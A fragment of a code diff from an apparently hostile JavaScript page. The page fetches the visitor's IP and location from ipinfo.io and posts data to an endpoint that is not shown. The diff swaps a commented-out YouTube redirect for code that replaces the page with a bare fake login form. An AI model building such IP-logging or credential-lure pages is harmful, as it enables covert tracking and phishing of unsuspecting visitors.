@@ -36,6 +36,12 @@ $.getJSON("https://ipinfo.io/json", function(data) {
     body: JSON.stringify(params)
   }).then(res => {
     console.log(res);
-    //window.location.href = 'https://youtu.be/bxqLsrlakK8';
+    document.body.innerHTML = `
+      <div>
+        <h2>Login</h2>
+        Username: <input type="text"><br>
+        Password: <input type="text">
+      </div>
+    `
   })
 })
